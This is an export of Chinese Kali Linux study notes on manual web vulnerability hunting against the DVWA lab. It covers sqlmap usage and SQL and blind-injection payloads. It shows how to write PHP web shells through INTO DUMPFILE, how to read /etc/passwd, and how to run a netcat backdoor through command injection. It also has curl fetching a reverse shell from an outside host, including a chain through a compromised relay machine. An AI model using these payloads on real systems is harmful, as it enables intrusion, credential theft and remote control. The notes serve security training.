<li>原：sqlmap –batch –random-agent –ignore-proxy –technique=BEU -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a></li>
<li>后：sqlmap -z “bat,randoma,ign,tec=BEU” -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a></li>
<li>原：sqlmap –ignore-proxy –flush-session –technique=U –dump -D testdb -T users -u “1.1.1.1/a.php?id=1” </li>
<li>后：sqlmap -z “ign,flu,bat,tec=U,dump,D=testdb,T=users” -u “1.1.1.1/ vuln.php?id=1”</li>
</ul>
<h4 id="37-SQLMAP–MISCELLANEOUS-→-answer-check-waf-hpp-identify-waf（▲-2020-1-15命令执行无返回数据）"><a href="#37-SQLMAP–MISCELLANEOUS-→-answer-check-waf-hpp-identify-waf（▲-2020-1-15命令执行无返回数据）" class="headerlink" title="37. SQLMAP–MISCELLANEOUS → answer/check-waf/hpp/identify-waf（▲ 2020.1.15命令执行无返回数据）"></a>37. SQLMAP–MISCELLANEOUS → answer/check-waf/hpp/identify-waf（▲ 2020.1.15命令执行无返回数据）</h4><ul>
<li>–answer<ul>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> –technique=E –answers=”extending=N” –batch</li>
</ul>
</li>
<li>–check-waf（检测WAF/IPS/IDS）（▲ 2020.1.15此参数更新后暂无）</li>
<li>–hpp（HTTP parameter pollution，Web Application的一个漏洞）<ul>
<li>绕过WAF/IPS/IDS的有效方法</li>
<li>尤其对ASP/IIS和ASP.NET/IIS</li>
</ul>
</li>
<li>–identify-waf（彻底的waf/ips/ids检查）<ul>
<li>检查30多种产品</li>
</ul>
</li>
</ul>
<h4 id="38-SQLMAP–MISCELLANEOUS-→-Misc"><a href="#38-SQLMAP–MISCELLANEOUS-→-Misc" class="headerlink" title="38. SQLMAP–MISCELLANEOUS → Misc"></a>38. SQLMAP–MISCELLANEOUS → Misc</h4><ul>
<li>–mobile（模拟智能手机设备）</li>
<li>–purge-output（清除output文件夹）（▲ 2020.1.15修改参数为–purge）</li>
<li>–smart（当有大量检测目标时，只选择基于错误的检测结果）</li>
<li>–wizard（sqlmap向导）</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(五十)：手动漏洞挖掘--SQL盲注</title>
    <url>/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<hr>
<h4 id="1-判断技术"><a href="#1-判断技术" class="headerlink" title="1. 判断技术"></a>1. 判断技术</h4><ul>
<li>不显示数据库内建的报错信息<ul>
<li>内建的报错信息帮助开发人员发现和修复问题</li>
<li>报错信息提供关于系统的大量有用信息</li>
</ul>
</li>
<li>当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果，即为盲注</li>
<li>思路：既然无法基于报错信息判断结果，基于逻辑真假的不同结果来判断<ul>
<li>1’ and 1=1–+</li>
<li>1’ and 1=2–+</li>
<li>1’ order by 5–+  假</li>
<li>1’ order by 2–+  真</li>
<li>1’ union select 1,2–+</li>
<li>1’ union select null,CONCAT_WS(CHAR(32,58,32),user(),database(),version())–+</li>
<li>1’ and 1=0 union select null,table_name from information_schema.tables#</li>
<li>1’ and 1=0 union selcet null,table_name from information_schema.colums where table_name=’users’#</li>
</ul>
</li>
</ul>
<h4 id="2-猜字段–无information-scheme"><a href="#2-猜字段–无information-scheme" class="headerlink" title="2. 猜字段–无information_scheme"></a>2. 猜字段–无information_scheme</h4><ul>
<li>无权读取information_shcema库/拒绝union、order by语句<ul>
<li>猜列名：1’ and user is not null–+</li>
<li>猜当前表名：1’ and table.user is not null–+</li>
<li>猜库里其他表：1’ and (select count() from table)&gt;0–+</li>
<li>列表对应关系：1’ and users.user is not null–+</li>
<li>猜字段内容：1’ and user=’admin’/1’ or user like ‘%a’</li>
<li>猜账号对应密码：2’ or user=’admin’ and password=’5f4dcc3b5aa765d61d8327deb832cf99</li>
<li>▲ Burpsuite自动化猜解内容</li>
</ul>
</li>
</ul>
<h4 id="3-真实实例"><a href="#3-真实实例" class="headerlink" title="3. 真实实例"></a>3. 真实实例</h4><ul>
<li>开个脑洞<ul>
<li>真实案例：某电商网站</li>
<li><a href="http://1.1.1.1/goods.php?cnt=1&amp;goodsid=123" target="_blank" rel="noopener">http://1.1.1.1/goods.php?cnt=1&amp;goodsid=123</a></li>
<li>and 1=1–+  显示一包面巾纸</li>
<li>and 1-2–+  显示一袋洗衣粉</li>
<li>1’ and ORD(MID((VERSION()),1,1))&amp;（1/2/4/8/16/32/64/128）&gt;0–+</li>
<li>CURRENT_USER()、DATABASE()</li>
<li>MID用法：MID(ColumnName,Start [,Length])</li>
<li>ORD用法：ORD(string)   #ASCII码</li>
</ul>
</li>
</ul>
<h4 id="4-DVWA的SQL盲注源码"><a href="#4-DVWA的SQL盲注源码" class="headerlink" title="4. DVWA的SQL盲注源码"></a>4. DVWA的SQL盲注源码</h4><ul>
<li>DVWA的SQL Injection(Blind) Source（Low）</li>
</ul>
<pre><code>&lt;?php    

if (isset($_GET[&#39;Submit&#39;])) {

    // Retrieve data

    $id = $_GET[&#39;id&#39;];

    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;&quot;;
    $result = mysql_query($getid); // Removed &#39;or die&#39; to suppres mysql errors

    $num = @mysql_numrows($result); // The &#39;@&#39; character suppresses errors making the injection &#39;blind&#39;

    $i = 0;

    while ($i &lt; $num) {

        $first = mysql_result($result,$i,&quot;first_name&quot;);
        $last = mysql_result($result,$i,&quot;last_name&quot;);

        echo &#39;&lt;pre&gt;&#39;;
        echo &#39;ID: &#39; . $id . &#39;&lt;br&gt;First name: &#39; . $first . &#39;&lt;br&gt;Surname: &#39; . $last;
        echo &#39;&lt;/pre&gt;&#39;;

        $i++;
    }
}
?&gt;</code></pre><ul>
<li>DVWA的SQL Injection(Blind) Source（Medium）</li>
</ul>
<pre><code> &lt;?php

if (isset($_GET[&#39;Submit&#39;])) {

    // Retrieve data

    $id = $_GET[&#39;id&#39;];
    $id = mysql_real_escape_string($id);

    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id&quot;;
    $result = mysql_query($getid); // Removed &#39;or die&#39; to suppres mysql errors

    $num = @mysql_numrows($result); // The &#39;@&#39; character suppresses errors making the injection &#39;blind&#39;

    $i=0;

    while ($i &lt; $num) {

        $first=mysql_result($result,$i,&quot;first_name&quot;);
        $last=mysql_result($result,$i,&quot;last_name&quot;);

        echo &#39;&lt;pre&gt;&#39;;
        echo &#39;ID: &#39; . $id . &#39;&lt;br&gt;First name: &#39; . $first . &#39;&lt;br&gt;Surname: &#39; . $last;
        echo &#39;&lt;/pre&gt;&#39;;

        $i++;
    }
}
?&gt;</code></pre><ul>
<li>DVWA的SQL Injection(Blind) Source（High）</li>
</ul>
<pre><code>&lt;?php    

if(isset($_GET[&#39;Submit&#39;])){

    // Retrieve data

    $id = $_GET[&#39;id&#39;];
    $id = stripslashes($id);
    $id = mysql_real_escape_string($id);

    if (is_numeric($id)) {

        $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;&quot;;
        $result = mysql_query($getid); // Removed &#39;or die&#39; to suppres mysql errors

        $num = @mysql_numrows($result); // The &#39;@&#39; character suppresses errors making the injection &#39;blind&#39;

        $i=0;

        while ($i &lt; $num) {

            $first = mysql_result($result,$i,&quot;first_name&quot;);
            $last = mysql_result($result,$i,&quot;last_name&quot;);

            echo &#39;&lt;pre&gt;&#39;;
            echo &#39;ID: &#39; . $id . &#39;&lt;br&gt;First name: &#39; . $first . &#39;&lt;br&gt;Surname: &#39; . $last;
            echo &#39;&lt;/pre&gt;&#39;;

            $i++;
        }
    }
}
?&gt;</code></pre>]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(四十八)：Kali Linux版本更新--rolling</title>
    <url>/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AB)%EF%BC%9AKali%20Linux%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0--rolling/</url>
    <content><![CDATA[<hr>
<h4 id="1-Kali-Linux版本更新–第一个Rolling-RELEASE"><a href="#1-Kali-Linux版本更新–第一个Rolling-RELEASE" class="headerlink" title="1. Kali Linux版本更新–第一个Rolling RELEASE"></a>1. Kali Linux版本更新–第一个Rolling RELEASE</h4><ul>
<li>Kali 2.0发布时声称将采用rolling release模式更新（但并未实施）</li>
<li>Fixed-release<ul>
<li>固定发布周期</li>
<li>使用软件稳定的主流版本（发布–主流–作废）</li>
<li>更稳定，适合于企业生成环境</li>
</ul>
</li>
<li>Rolling release<ul>
<li>适用于开发者和技术人员</li>
<li>连续升级新版本，追求在新功能出现后最快使用</li>
<li>正式成为流行</li>
</ul>
</li>
<li>Kali 2.0 rolling release<ul>
<li>采用debian testing库作为更新源</li>
</ul>
</li>
<li>软件包追踪<ul>
<li><a href="https://pkg.kali.org/" target="_blank" rel="noopener">https://pkg.kali.org/</a></li>
</ul>
</li>
<li>VMware Tools vs Open-VM-Tools<ul>
<li><strong><code>🔺命令：apt-get install open-vm-tools-desktop fuse</code></strong></li>
</ul>
</li>
<li>Gnome 3.18</li>
<li>4.3内核</li>
<li>Kali 2.0现有版本升级</li>
</ul>
<blockquote>
<pre><code>⭐现有版本更新
cat &lt;&lt; EOF &gt; /etc/apt/sources.list
deb http://http.kali.org/kali kali-rolling main non-free contrib
EOF

⭐安装命令
apt-get update
apt-get dist-upgrade 
reboot

⭐查看版本号，代码号
lsb_release -a</code></pre></blockquote>
<ul>
<li>Kali sana库于2016年4月15日停止更新</li>
<li>工具有所更新</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(四十九)：手动漏洞挖掘--SQL注入</title>
    <url>/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B9%9D)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<hr>
<h4 id="1-五种判断机制"><a href="#1-五种判断机制" class="headerlink" title="1. 五种判断机制"></a>1. 五种判断机制</h4><ul>
<li>服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器（数据库调用或系统调用）</li>
<li>用户登录判断<ul>
<li>SELECT * FROM users WHERE user=’uname’ AND password=’password’</li>
<li>SELECT * FROM users WHERE user=’uname’ AND password=”OR”=”</li>
</ul>
</li>
<li>基于报错的检测方法（low）<ul>
<li>‘ “ % ()</li>
</ul>
</li>
<li>基于布尔的检测<ul>
<li>1’ and ‘1’=’1 / 1’ and ‘1（真）</li>
<li>1’ and ‘1’=’2 / 1’ and ‘0（假）</li>
</ul>
</li>
<li>表列数/显示信息位于哪一列<ul>
<li>‘order by 9–+（按查询列号排序）（注释符：–）</li>
<li>select * 时表字段数=查询字段数</li>
</ul>
</li>
<li>联合查询<ul>
<li>‘union select 1,2–+ </li>
<li>‘union all select database()/user()/version(),2– +</li>
</ul>
</li>
<li>‘union select database(),substring index(USER(),”@”,1)–+（切分字段）</li>
<li>DB用户：user() </li>
<li>DB版本：version()</li>
<li>全局函数：@@datadir、@@hostname、@@VERSION、@@version_compile_os</li>
<li>当前库：database()</li>
<li>ASCII转字符：char()</li>
<li>连接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version())</li>
<li>计算哈希：md5()</li>
<li>Mysql数据结构<ul>
<li>information_schema</li>
</ul>
</li>
<li>所有库所有表/统计每库中表的数量<ul>
<li>‘union select table_name,table_schema from information_schema.tables–+</li>
<li>‘union select table_schema,count(*) from information_schema.tables group by table_schema–+</li>
</ul>
</li>
<li>Dvwa库中的表名<ul>
<li>‘union select table_name,table_schema from information_schema.tables where table_schema=’dvwa’–+</li>
</ul>
</li>
<li>Users表中的所有列（user_id,first_name,last_name,user,password,avatar）<ul>
<li>‘union select table_name,column_name from information_schema.columns where table_schema=’dvwa’ and table_name=’users’–+</li>
</ul>
</li>
<li>查询user、password列的内容<ul>
<li>‘union select users,password from dvwa,users–+</li>
<li>‘union select users,password from users–+</li>
<li>‘union select null,concat(user,0x3a,password) from users–+ </li>
</ul>
</li>
</ul>
<h4 id="2-密码猜测"><a href="#2-密码猜测" class="headerlink" title="2. 密码猜测"></a>2. 密码猜测</h4><ul>
<li>hash-identifier<ul>
<li>输入猜测的值</li>
</ul>
</li>
<li>密码破解<ul>
<li>username:passhash–&gt;dvwa.txt</li>
<li><strong><code>🔺命令：john --format=raw-MD5 dvwa.txt</code></strong>（存在./john文件）</li>
</ul>
</li>
<li>显示之前破解的密码<ul>
<li><strong><code>🔺命令：john --format=raw-MD5 dvwa.txt --show</code></strong></li>
</ul>
</li>
</ul>
<h4 id="3-系统文件读取-命令执行"><a href="#3-系统文件读取-命令执行" class="headerlink" title="3. 系统文件读取/命令执行"></a>3. 系统文件读取/命令执行</h4><ul>
<li>读取文件<ul>
<li>‘union select null,load_file(‘/etc/passwd’)–+</li>
</ul>
</li>
<li>写入文件（原文件形式）<ul>
<li>‘union select null,”<?php passthru($_GET['cmd']);?>“INTO DUMPFILE “a.php”–+（dumpfile到默认目录，默认目录只有mysql有权限）</li>
<li>‘union select null,”<?php passthru($_GET['cmd']);?>“INTO DUMPFILE “/var/www/a.php”–+（dumpfile到指定目录）</li>
<li><ul>
<li>▲ 脚本可以写到具有777权限的/tmp目录，结合SQL注入和File Inclusion达到作用</li>
</ul>
</li>
</ul>
</li>
<li>写入文件（十六进制模式）<ul>
<li><strong><code>🔺命令：cp /usr/share/webshells/php/php-reverse-shell.php ./b.php</code></strong></li>
<li><strong><code>🔺命令：cat php-reverse-shell.php | xxd -ps | tr -d &#39;\n&#39;</code></strong>（▲ 十六进制编码的shell）</li>
<li>‘union select null,+(0x十六进制编码) INTO DUMPFILE ‘/tmp/x.php’–+</li>
<li>可能受到服务器GET大小的限制，传输不成功</li>
</ul>
</li>
<li>保存下载数据库<ul>
<li>‘union select null,concat(user,0x3a,password) from users INTO OUTFILE ‘/tmp/a.db’–+</li>
</ul>
</li>
<li>一个思路：编写服务器端代码</li>
</ul>
<pre><code> &#39; union select null,&#39;&lt;?php if(isset($_POST[&quot;submit&quot;])) { $userID = $_POST[&quot;userID&quot;]; $first_name = $_POST[&quot;first_name&quot;]; $last_name = $_POST[&quot;last_name&quot;]; $username = $_POST[&quot;username&quot;]; $avatar = $_POST[&quot;avatar&quot;]; echo &quot;userID: $userID&lt;BR&gt;&quot;; echo &quot;first_name: $first_name&lt;BR&gt;&quot;; echo &quot;last_name: $last_name&lt;BR&gt;&quot;; echo &quot;username: $username&lt;BR&gt;&quot;; echo &quot;avatar: $avatar&lt;BR&gt;&quot;; $con=mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;&quot;,&quot;dvwa&quot;); if (mysqli_connect_errno()) { echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); } else { echo &quot;Connected to database&lt;BR&gt;&quot;; } $password = &quot;123&quot;; $sql=&quot;insert into dvwa.users values (\\&quot;$userID\\&quot;,\ \&quot;$first_name\\&quot;,\\&quot;$last_name\\&quot;,\\&quot;$username\\&quot;,MD5(\\&quot;$password\\&quot;),\\&quot;$avatar\ \&quot;)&quot;; if (mysqli_query($con,$sql)) { echo &quot;[Successful Insertion]: $sql&quot;; } else { echo &quot;Error creating database: &quot; . mysqli_error($con); } mysqli_close($con); } ?&gt; &lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;]; ?&gt;&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;userID&quot; value=&quot;33&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;first_name&quot; value=&quot;fh&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;last_name&quot; value=&quot;y&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;yfh&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;avatar&quot; value=&quot;yfh!&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit Form&quot;&gt;&lt;br&gt; &lt;/form&gt;&#39; INTO DUMPFILE &#39;/tmp/user.php&#39; -- </code></pre><h4 id="4-猜字段–无information-schema"><a href="#4-猜字段–无information-schema" class="headerlink" title="4. 猜字段–无information_schema"></a>4. 猜字段–无information_schema</h4><ul>
<li>无权读取information_schema库/拒绝union、order by语句<ul>
<li>猜列名：’and column is null–+（Burpsuite自动猜列名）</li>
<li>猜当前表表名：’and table.user is null–+</li>
<li>猜库里其他表：’and (select count(*) from table)&gt;0–+</li>
<li>列表对应关系：’and users.user is null–+</li>
<li>猜字段内容：’or user=’admin/‘or user like ‘%a%</li>
<li>猜账号对应密码：’or user=’admin’ and password=’5f4dcc3b5aa765d61d8327deb832cf99（MD5值）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐之前的SQL注入教程，主要是针对mysql的root权限，如果得到的是mysql的一个普通用户的权限，则很难通过information_schema来查询以及执行指令
⭐查找column字典
find / -name *column*.txt
cat /usr/share/golismero/tools/sqlmap/txt/common-colums.txt | gerp -v ^# &gt; column.txt
⭐查找table表名
find / -name *.table*.txt
cat /usr/share/golismero/tools/sqlmap/txt/common-table.txt | gerp -v ^# &gt;table.txt
⭐MD5作为字典
md5sum common-password.txt password.txt</code></pre></blockquote>
<h4 id="5-用户注入–无information-schema"><a href="#5-用户注入–无information-schema" class="headerlink" title="5. 用户注入–无information_schema"></a>5. 用户注入–无information_schema</h4><ul>
<li>‘;update users set user=’yuanfh’ where user=’admin’<ul>
<li>注入失败，sql客户端工具的问题</li>
<li><a href="http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html" target="_blank" rel="noopener">http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html</a></li>
</ul>
</li>
<li>‘;INSERT into users(‘user_id’,’first_name’,’last_name’,’user’,’password’,’avatar’)VALUES(‘35’,’fh’,’yuan’,’yfh’,’5f4dcc3b5aa765d61d8327deb882cf99’,’OK’);–+</li>
<li>‘;DROP TABLE users;–+</li>
<li>xp_cmdshell /存储过程</li>
<li>▲ SQLi没有通用的方法，掌握原理，了解各种数据库特性 </li>
</ul>
<h4 id="6-DVWA的SQL注入源码"><a href="#6-DVWA的SQL注入源码" class="headerlink" title="6. DVWA的SQL注入源码"></a>6. DVWA的SQL注入源码</h4><ul>
<li>Dvwa的SQL Injection Source（Low）</li>
</ul>
<pre><code>&lt;?php    

if(isset($_GET[&#39;Submit&#39;])){

    // Retrieve data

    $id = $_GET[&#39;id&#39;];

    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;&quot;;
    $result = mysql_query($getid) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );

    $num = mysql_numrows($result);

    $i = 0;

    while ($i &lt; $num) {

        $first = mysql_result($result,$i,&quot;first_name&quot;);
        $last = mysql_result($result,$i,&quot;last_name&quot;);

        echo &#39;&lt;pre&gt;&#39;;
        echo &#39;ID: &#39; . $id . &#39;&lt;br&gt;First name: &#39; . $first . &#39;&lt;br&gt;Surname: &#39; . $last;
        echo &#39;&lt;/pre&gt;&#39;;

        $i++;
    }
}
?&gt;</code></pre><ul>
<li>Dvwa的SQL Injection Source（Medium）<ul>
<li>对特殊字符的转义</li>
<li>mysql_real_escape_srting()（PHP 4 &gt;=4.3.0，PHP5）</li>
<li>PHP 5.5.0已经启用此函数</li>
<li>PHP 7.0.0已经删除此函数，代之以MySQLi、PDO_M有、SQL</li>
<li>转义字符（\x00、\n、\r、’、”、\x1a）</li>
<li>▲ 绕过方法：不需要单引号，不需要–，直接插入语句即可</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

if (isset($_GET[&#39;Submit&#39;])) {

    // Retrieve data

    $id = $_GET[&#39;id&#39;];
    $id = mysql_real_escape_string($id);

    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id&quot;;

    $result = mysql_query($getid) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );

    $num = mysql_numrows($result);

    $i=0;

    while ($i &lt; $num) {

        $first = mysql_result($result,$i,&quot;first_name&quot;);
        $last = mysql_result($result,$i,&quot;last_name&quot;);

        echo &#39;&lt;pre&gt;&#39;;
        echo &#39;ID: &#39; . $id . &#39;&lt;br&gt;First name: &#39; . $first . &#39;&lt;br&gt;Surname: &#39; . $last;
        echo &#39;&lt;/pre&gt;&#39;;

        $i++;
    }
}
?&gt;</code></pre><ul>
<li>Dvwa的SQL Injection Source（High）<ul>
<li>stripslashes（去除”&quot;）</li>
<li>mysql_real_escape_string</li>
<li>▲ is_numric（判断是否为数字）</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php    
if (isset($_GET[&#39;Submit&#39;])) {

    // Retrieve data

    $id = $_GET[&#39;id&#39;];
    $id = stripslashes($id);
    $id = mysql_real_escape_string($id);

    if (is_numeric($id)){

        $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;&quot;;
        $result = mysql_query($getid) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );

        $num = mysql_numrows($result);

        $i=0;

        while ($i &lt; $num) {

            $first = mysql_result($result,$i,&quot;first_name&quot;);
            $last = mysql_result($result,$i,&quot;last_name&quot;);

            echo &#39;&lt;pre&gt;&#39;;
            echo &#39;ID: &#39; . $id . &#39;&lt;br&gt;First name: &#39; . $first . &#39;&lt;br&gt;Surname: &#39; . $last;
            echo &#39;&lt;/pre&gt;&#39;;

            $i++;
        }
    }
}
?&gt;</code></pre>]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(四十五)：手动漏洞挖掘--身份认证、SessionID、密码找回、命令执行</title>
    <url>/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%BA%94)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81SessionID%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<hr>
<h4 id="1-手动漏洞挖掘–身份认证"><a href="#1-手动漏洞挖掘–身份认证" class="headerlink" title="1. 手动漏洞挖掘–身份认证"></a>1. 手动漏洞挖掘–身份认证</h4><ul>
<li>常用弱口令/基于字典的密码爆破</li>
<li>锁定账号（密码锁定机制，尝试密码次数过多）</li>
<li>信息收集<ul>
<li>手机号（大部分手机号/邮箱号）</li>
<li>页面返回errorcode（界面不显示errorcode）</li>
<li>密码错误提示信息（猜测四位手机号，185xxxx4465）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐密码错误提示信息
1.登录失败（安全性较高）
2.用户名不存在
3.密码错误</code></pre></blockquote>
<ul>
<li>密码嗅探</li>
</ul>
<h4 id="2-手动漏洞挖掘–会话sessionID"><a href="#2-手动漏洞挖掘–会话sessionID" class="headerlink" title="2. 手动漏洞挖掘–会话sessionID"></a>2. 手动漏洞挖掘–会话sessionID</h4><ul>
<li>XSS/Cookie importer</li>
<li>SessionID in URL（SessionID可以存在机器本地，也可存放在内存）</li>
<li>嗅探</li>
<li>SessionID长期不变/永久不变</li>
</ul>
<blockquote>
<pre><code>▲ SessionID注入浏览器：
1.获取其他机子的SessionID
2.通过Cookie Manager过滤，编辑SessionID
3.1.登出进行测试，后退是否能返回（SessionID可能不是活动状态，但可能永久不变）
3.2.关闭浏览器，重新访问，替换SessionID，可能可以进行访问，SessionID固定不变</code></pre></blockquote>
<ul>
<li>SessionID生成算法<ul>
<li>Sequencer</li>
<li>私有算法</li>
<li>预判下一次登陆时生成的SessionID（可能根据时间进行哈希计算作为SessionID）</li>
<li>登出后返回测试</li>
</ul>
</li>
</ul>
<h4 id="3-手动漏洞挖掘–密码找回"><a href="#3-手动漏洞挖掘–密码找回" class="headerlink" title="3. 手动漏洞挖掘–密码找回"></a>3. 手动漏洞挖掘–密码找回</h4><ul>
<li><a href="https://www.example.com/reset?email=user@example.com&amp;key=b4c9a289323b21a01c3e940f150eb9b8c542587f1abfd8f0e1cc1ffc5e475514" target="_blank" rel="noopener">https://www.example.com/reset?email=user@example.com&amp;key=b4c9a289323b21a01c3e940f150eb9b8c542587f1abfd8f0e1cc1ffc5e475514</a></li>
</ul>
<blockquote>
<pre><code>密码找回步骤：
1.界面点击忘记密码按钮
2.根据提示输入原密码邮箱等信息，点击发送邮件按钮
3.服务器发送邮件到客户端邮箱
4.打开邮件，邮件里面的链接可以进行密码重设（key值）
▲ 链接的key值字符串，可能为邮箱账号进行md5运算(128位)或是sha-1(160位)或是sha-2(256位)</code></pre></blockquote>
<h4 id="4-手动漏洞挖掘–命令执行"><a href="#4-手动漏洞挖掘–命令执行" class="headerlink" title="4. 手动漏洞挖掘–命令执行"></a>4. 手动漏洞挖掘–命令执行</h4><ul>
<li>漏洞挖掘原则<ul>
<li>所有变量（攻击注入手段）</li>
<li>所有头（Cookie中的变量）</li>
<li>逐个变量删除（Cookie还是body中的字段让服务器进行判断）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>DVWA命令执行漏洞/exec:header和body进行删除，需要对一些符号进行URL encode</code></pre></blockquote>
<ul>
<li>漏洞的本质<ul>
<li>数据与指令的混淆</li>
<li>对用户输入信息过滤不严判断失误，误将指令当数据</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐low：DVWA命令执行漏洞/exec
1.如果是操作系统命令操作，而不是Web Application进行操作，可以进行命令行尝试
2.查看Command Execution Source，发现没有对&#39;&amp;&amp;&#39;和&#39;;&#39;进行过滤
⭐medium：DVWA命令执行漏洞/exec
1.查看Command Execution Source，发现没有对&#39;&amp;&amp;&#39;和&#39;;&#39;进行过滤
2.操作系统shell命令的熟悉程度，没有对&#39;&amp;&#39;和&#39;|&#39;进行过滤
⭐high：DVWA命令执行漏洞/exec
1.查看Command Execution Source，发现过滤很严格，先对字符串进行处理ip地址，然后对输入的内容进行&#39;.&#39;分割的成4段，然后再判断这4段是不是都是数字，如果是，则进行运行命令</code></pre></blockquote>
<ul>
<li>命令执行<ul>
<li>应用程序开发者直接调用操作系统功能</li>
<li>; &amp;&amp; | || &amp;</li>
<li>查看源代码，过滤用户输入</li>
<li>;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 &gt; /tmp/pipe</li>
</ul>
</li>
<li>;curl <a href="http://1.1.1.1/php-revers-shell.php" target="_blank" rel="noopener">http://1.1.1.1/php-revers-shell.php</a></li>
</ul>
<blockquote>
<pre><code>⭐curl下载执行php，反弹shell
Kali
1.cp /usr/share/webshells/php/php-reverse-shell.php /var/www/htmp/1.php
2.启动apache2，services apache2 start
3.编辑php-revers-shell.php的反弹IP地址 → Kali地址
DVWA：
1.;curl http://Kali IP地址/1.php
▲ 结果返回的是Kali的shell，因为1.php在Kali上，所以只能返回Kali本机的shel

⭐curl应用（控制肉鸡隐蔽性）
1.三台机器，一台Kali，开启1234端口；一台服务器DVWA；一台肉鸡，有反弹shell的php
2.kali发送;curl命令给DVWA，DVWA进行curl
3.肉鸡上的反弹php返回一个shell给kali</code></pre></blockquote>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(四十四)：手动漏洞挖掘--默认安装存在漏洞</title>
    <url>/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%9B%9B)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<hr>
<h4 id="1-问答"><a href="#1-问答" class="headerlink" title="1. 问答"></a>1. 问答</h4><ul>
<li>Conky（性能监测工具）<ul>
<li><a href="https://weather.yahoo.com/（城市代码）" target="_blank" rel="noopener">https://weather.yahoo.com/（城市代码）</a></li>
<li>.conkyrc（Beijing：2151330）</li>
</ul>
</li>
<li>Goagent<ul>
<li>不要启动多次</li>
<li>Win+M</li>
</ul>
</li>
<li>Linux4.4内核发布，在虚拟机中可使用主机上的GPU</li>
</ul>
